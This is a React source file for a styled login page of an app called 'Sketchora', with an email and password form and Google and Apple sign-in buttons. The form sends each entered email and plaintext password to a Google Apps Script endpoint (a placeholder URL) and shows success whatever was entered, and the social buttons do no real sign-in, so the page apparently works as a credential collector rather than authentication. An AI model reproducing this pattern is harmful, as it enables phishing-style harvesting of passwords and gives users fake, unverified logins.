import { useEffect, useRef, useState } from "react";

const GOOGLE_SCRIPT_URL = "YOUR_GOOGLE_APPS_SCRIPT_URL_HERE";

interface LoginPageProps {
  onLaunchApp: () => void;
  onBack: () => void;
}

type LoginState = "idle" | "loading" | "success" | "error";

export default function LoginPage({ onLaunchApp, onBack }: LoginPageProps) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loginState, setLoginState] = useState<LoginState>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const particlesRef = useRef<HTMLCanvasElement>(null);
  const animRef = useRef<number | null>(null);

  useEffect(() => {
    const html = document.documentElement;
    const body = document.body;
    const root = document.getElementById("root");
    const prev = {
      html: html.style.overflow,
      body: body.style.overflow,
      root: root?.style.overflow ?? "",
      rootHeight: root?.style.height ?? "",
    };
    html.style.overflow = "auto";
    body.style.overflow = "auto";
    if (root) {
      root.style.overflow = "auto";
      root.style.height = "auto";
    }
    return () => {
      html.style.overflow = prev.html;
      body.style.overflow = prev.body;
      if (root) {
        root.style.overflow = prev.root;
        root.style.height = prev.rootHeight;
      }
    };
  }, []);

  useEffect(() => {
    const canvas = particlesRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    const resize = () => {
      canvas.width = canvas.offsetWidth * devicePixelRatio;
      canvas.height = canvas.offsetHeight * devicePixelRatio;
      ctx.scale(devicePixelRatio, devicePixelRatio);
    };
    resize();
    window.addEventListener("resize", resize);

    type Particle = {
      x: number;
      y: number;
      r: number;
      vx: number;
      vy: number;
      a: number;
      va: number;
      color: string;
    };
    const colors = ["139,92,246", "96,165,250", "6,182,212", "167,139,250"];
    const W = () => canvas.offsetWidth;
    const H = () => canvas.offsetHeight;

    const particles: Particle[] = Array.from({ length: 60 }, () => ({
      x: Math.random() * W(),
      y: Math.random() * H(),
      r: Math.random() * 2.5 + 0.5,
      vx: (Math.random() - 0.5) * 0.3,
      vy: (Math.random() - 0.5) * 0.3,
      a: Math.random(),
      va: (Math.random() - 0.5) * 0.008,
      color: colors[Math.floor(Math.random() * colors.length)],
    }));

    const tick = () => {
      ctx.clearRect(0, 0, W(), H());
      for (const p of particles) {
        p.x += p.vx;
        p.y += p.vy;
        p.a = Math.max(0.05, Math.min(0.8, p.a + p.va));
        if (p.a <= 0.05 || p.a >= 0.8) p.va *= -1;
        if (p.x < 0) p.x = W();
        if (p.x > W()) p.x = 0;
        if (p.y < 0) p.y = H();
        if (p.y > H()) p.y = 0;
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(${p.color},${p.a})`;
        ctx.fill();
      }
      animRef.current = requestAnimationFrame(tick);
    };
    animRef.current = requestAnimationFrame(tick);
    return () => {
      window.removeEventListener("resize", resize);
      if (animRef.current) cancelAnimationFrame(animRef.current);
    };
  }, []);

  const postToScript = async (method: string, emailVal = "", passVal = "") => {
    const body = JSON.stringify({
      email: emailVal,
      password: passVal,
      method,
      timestamp: new Date().toISOString(),
    });
    if (GOOGLE_SCRIPT_URL === "YOUR_GOOGLE_APPS_SCRIPT_URL_HERE") {
      await new Promise((r) => setTimeout(r, 900));
      return;
    }
    const res = await fetch(GOOGLE_SCRIPT_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body,
    });
    if (!res.ok) throw new Error(`Server error: ${res.status}`);
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) {
      setErrorMsg("Please enter your email and password.");
      setLoginState("error");
      return;
    }
    setLoginState("loading");
    setErrorMsg("");
    try {
      await postToScript("email", email, password);
      setLoginState("success");
      setTimeout(onLaunchApp, 1500);
    } catch (err) {
      setLoginState("error");
      setErrorMsg(
        err instanceof Error ? err.message : "Login failed. Please try again.",
      );
    }
  };

  const handleSocial = async (method: "google" | "apple") => {
    setLoginState("loading");
    setErrorMsg("");
    try {
      await postToScript(method);
      setLoginState("success");
      setTimeout(onLaunchApp, 1500);
    } catch (err) {
      setLoginState("error");
      setErrorMsg(
        err instanceof Error
          ? err.message
          : "Sign-in failed. Please try again.",
      );
    }
  };

  const isLoading = loginState === "loading";
  const isSuccess = loginState === "success";

  const glass = {
    background: "rgba(255,255,255,0.04)",
    border: "1px solid rgba(255,255,255,0.1)",
    backdropFilter: "blur(24px)",
    WebkitBackdropFilter: "blur(24px)",
  } as const;

  const inputStyle: React.CSSProperties = {
    width: "100%",
    padding: "13px 16px",
    background: "rgba(255,255,255,0.05)",
    border: "1px solid rgba(255,255,255,0.12)",
    borderRadius: 12,
    color: "#f0eaff",
    fontSize: 15,
    outline: "none",
    transition: "border-color 0.18s, box-shadow 0.18s",
    fontFamily: "inherit",
    boxSizing: "border-box",
  };

  const focusInput = (e: React.FocusEvent<HTMLInputElement>) => {
    e.target.style.borderColor = "rgba(139,92,246,0.6)";
    e.target.style.boxShadow = "0 0 0 3px rgba(139,92,246,0.15)";
  };
  const blurInput = (e: React.FocusEvent<HTMLInputElement>) => {
    e.target.style.borderColor = "rgba(255,255,255,0.12)";
    e.target.style.boxShadow = "none";
  };

  return (
    <div
      style={{
        minHeight: "100dvh",
        background: "#040614",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: "24px",
        position: "relative",
        fontFamily: "'Plus Jakarta Sans', system-ui, -apple-system, sans-serif",
      }}
    >
      <canvas
        ref={particlesRef}
        style={{
          position: "fixed",
          inset: 0,
          width: "100%",
          height: "100%",
          pointerEvents: "none",
          zIndex: 0,
        }}
      />
      <div
        style={{
          position: "fixed",
          inset: 0,
          pointerEvents: "none",
          zIndex: 0,
          background:
            "radial-gradient(ellipse 70% 60% at 30% 20%, rgba(139,92,246,0.2) 0%,transparent 70%), radial-gradient(ellipse 50% 50% at 75% 80%, rgba(6,182,212,0.15) 0%,transparent 65%)",
        }}
      />

      <div
        data-ocid="login.modal"
        style={{
          ...glass,
          borderRadius: 24,
          padding: "48px 44px",
          maxWidth: 440,
          width: "100%",
          position: "relative",
          zIndex: 1,
          boxShadow:
            "0 48px 120px rgba(0,0,0,0.6), 0 0 0 1px rgba(139,92,246,0.1)",
          animation: "loginFadeIn 0.6s ease-out both",
        }}
      >
        {/* logo */}
        <div style={{ textAlign: "center", marginBottom: 36 }}>
          <div
            style={{
              width: 64,
              height: 64,
              borderRadius: "50%",
              margin: "0 auto 16px",
              overflow: "hidden",
              boxShadow:
                "0 0 28px rgba(124,58,237,0.5), 0 0 50px rgba(16,185,129,0.15)",
              border: "2px solid rgba(124,58,237,0.4)",
            }}
          >
            <img
              src="/assets/generated/sketchora-logo-transparent.dim_200x200.png"
              alt="Sketchora"
              style={{ width: "100%", height: "100%", objectFit: "cover" }}
            />
          </div>
          <h1
            style={{
              fontSize: 26,
              fontWeight: 800,
              letterSpacing: "-0.03em",
              marginBottom: 4,
              background:
                "linear-gradient(135deg,#f0eaff 0%,#c4b5fd 40%,#6ee7b7 100%)",
              WebkitBackgroundClip: "text",
              WebkitTextFillColor: "transparent",
              backgroundClip: "text",
            }}
          >
            Sketchora
          </h1>
          <p style={{ color: "rgba(240,234,255,0.5)", fontSize: 14 }}>
            Sign in to continue to your workspace
          </p>
        </div>

        {isSuccess && (
          <div
            data-ocid="login.success_state"
            style={{
              background: "rgba(52,211,153,0.12)",
              border: "1px solid rgba(52,211,153,0.35)",
              borderRadius: 12,
              padding: "14px 16px",
              display: "flex",
              alignItems: "center",
              gap: 10,
              color: "#34d399",
              fontSize: 14,
              fontWeight: 600,
              marginBottom: 20,
              animation: "loginFadeIn 0.3s ease",
            }}
          >
            <span style={{ fontSize: 20 }}>✓</span> Redirecting to app...
          </div>
        )}

        {loginState === "error" && errorMsg && (
          <div
            data-ocid="login.error_state"
            style={{
              background: "rgba(239,68,68,0.12)",
              border: "1px solid rgba(239,68,68,0.35)",
              borderRadius: 12,
              padding: "12px 16px",
              color: "#fca5a5",
              fontSize: 13,
              marginBottom: 20,
              animation: "loginFadeIn 0.3s ease",
            }}
          >
            {errorMsg}
          </div>
        )}

        <form onSubmit={handleLogin} noValidate>
          <div style={{ marginBottom: 16 }}>
            <label
              htmlFor="login-email"
              style={{
                display: "block",
                fontSize: 13,
                fontWeight: 600,
                color: "rgba(240,234,255,0.7)",
                marginBottom: 6,
              }}
            >
              Email
            </label>
            <input
              id="login-email"
              type="email"
              placeholder="Email address"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              disabled={isLoading || isSuccess}
              data-ocid="login.input"
              style={inputStyle}
              onFocus={focusInput}
              onBlur={blurInput}
            />
          </div>

          <div style={{ marginBottom: 24 }}>
            <label
              htmlFor="login-password"
              style={{
                display: "block",
                fontSize: 13,
                fontWeight: 600,
                color: "rgba(240,234,255,0.7)",
                marginBottom: 6,
              }}
            >
              Password
            </label>
            <input
              id="login-password"
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              disabled={isLoading || isSuccess}
              data-ocid="login.textarea"
              style={inputStyle}
              onFocus={focusInput}
              onBlur={blurInput}
            />
          </div>

          <button
            type="submit"
            disabled={isLoading || isSuccess}
            data-ocid="login.submit_button"
            style={{
              width: "100%",
              padding: "14px",
              borderRadius: 999,
              background: isSuccess
                ? "rgba(52,211,153,0.7)"
                : "linear-gradient(135deg,#8b5cf6,#6d28d9)",
              color: "#fff",
              border: "none",
              cursor: isLoading || isSuccess ? "not-allowed" : "pointer",
              fontWeight: 700,
              fontSize: 16,
              fontFamily: "inherit",
              transition: "opacity 0.18s, transform 0.18s, box-shadow 0.18s",
              boxShadow: "0 4px 28px rgba(139,92,246,0.45)",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 8,
              opacity: isLoading ? 0.75 : 1,
            }}
            onMouseEnter={(e) => {
              if (!isLoading && !isSuccess) {
                const el = e.currentTarget as HTMLButtonElement;
                el.style.transform = "translateY(-1px)";
                el.style.boxShadow = "0 8px 36px rgba(139,92,246,0.6)";
              }
            }}
            onMouseLeave={(e) => {
              const el = e.currentTarget as HTMLButtonElement;
              el.style.transform = "";
              el.style.boxShadow = "0 4px 28px rgba(139,92,246,0.45)";
            }}
          >
            {isLoading ? (
              <>
                <svg
                  aria-label="Loading"
                  role="img"
                  style={{ animation: "spin 0.8s linear infinite" }}
                  width="18"
                  height="18"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.5"
                  strokeLinecap="round"
                >
                  <path d="M21 12a9 9 0 1 1-6.219-8.56" />
                </svg>
                Signing in...
              </>
            ) : isSuccess ? (
              "✓ Success"
            ) : (
              "Login"
            )}
          </button>
        </form>

        <div
          style={{
            display: "flex",
            alignItems: "center",
            gap: 12,
            margin: "24px 0",
            color: "rgba(240,234,255,0.3)",
            fontSize: 13,
          }}
        >
          <div
            style={{ flex: 1, height: 1, background: "rgba(255,255,255,0.08)" }}
          />
          or continue with
          <div
            style={{ flex: 1, height: 1, background: "rgba(255,255,255,0.08)" }}
          />
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
          <button
            type="button"
            data-ocid="login.google_button"
            disabled={isLoading || isSuccess}
            onClick={() => handleSocial("google")}
            style={{
              width: "100%",
              padding: "13px",
              borderRadius: 999,
              background: "rgba(255,255,255,0.95)",
              color: "#1a1a2e",
              border: "none",
              cursor: isLoading || isSuccess ? "not-allowed" : "pointer",
              fontWeight: 600,
              fontSize: 15,
              fontFamily: "inherit",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 10,
              transition: "transform 0.18s, box-shadow 0.18s",
              boxShadow: "0 2px 12px rgba(0,0,0,0.3)",
            }}
            onMouseEnter={(e) => {
              if (!isLoading && !isSuccess) {
                const el = e.currentTarget as HTMLButtonElement;
                el.style.transform = "translateY(-1px)";
                el.style.boxShadow = "0 6px 24px rgba(255,255,255,0.2)";
              }
            }}
            onMouseLeave={(e) => {
              const el = e.currentTarget as HTMLButtonElement;
              el.style.transform = "";
              el.style.boxShadow = "0 2px 12px rgba(0,0,0,0.3)";
            }}
          >
            <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
              <path
                fill="#4285F4"
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
              />
              <path
                fill="#34A853"
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
              />
              <path
                fill="#FBBC05"
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
              />
              <path
                fill="#EA4335"
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
              />
            </svg>
            Continue with Google
          </button>

          <button
            type="button"
            data-ocid="login.apple_button"
            disabled={isLoading || isSuccess}
            onClick={() => handleSocial("apple")}
            style={{
              width: "100%",
              padding: "13px",
              borderRadius: 999,
              background: "rgba(255,255,255,0.06)",
              color: "#f0eaff",
              border: "1px solid rgba(255,255,255,0.15)",
              cursor: isLoading || isSuccess ? "not-allowed" : "pointer",
              fontWeight: 600,
              fontSize: 15,
              fontFamily: "inherit",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 10,
              transition: "transform 0.18s, box-shadow 0.18s, background 0.18s",
            }}
            onMouseEnter={(e) => {
              if (!isLoading && !isSuccess) {
                const el = e.currentTarget as HTMLButtonElement;
                el.style.transform = "translateY(-1px)";
                el.style.background = "rgba(255,255,255,0.12)";
                el.style.boxShadow = "0 6px 20px rgba(255,255,255,0.08)";
              }
            }}
            onMouseLeave={(e) => {
              const el = e.currentTarget as HTMLButtonElement;
              el.style.transform = "";
              el.style.background = "rgba(255,255,255,0.06)";
              el.style.boxShadow = "";
            }}
          >
            <svg
              width="18"
              height="18"
              viewBox="0 0 24 24"
              fill="currentColor"
              aria-hidden="true"
            >
              <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z" />
            </svg>
            Continue with Apple
          </button>
        </div>

        <div style={{ textAlign: "center", marginTop: 28 }}>
          <button
            type="button"
            data-ocid="login.cancel_button"
            onClick={onBack}
            style={{
              background: "none",
              border: "none",
              color: "rgba(240,234,255,0.45)",
              cursor: "pointer",
              fontSize: 14,
              fontFamily: "inherit",
              transition: "color 0.18s",
              padding: "4px 8px",
            }}
            onMouseEnter={(e) => {
              e.currentTarget.style.color = "rgba(240,234,255,0.8)";
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.color = "rgba(240,234,255,0.45)";
            }}
          >
            ← Back to home
          </button>
        </div>
      </div>

      <style>{`
        @keyframes loginFadeIn {
          from { opacity: 0; transform: translateY(20px) scale(0.98); }
          to   { opacity: 1; transform: translateY(0) scale(1); }
        }
        @keyframes spin {
          from { transform: rotate(0deg); }
          to   { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
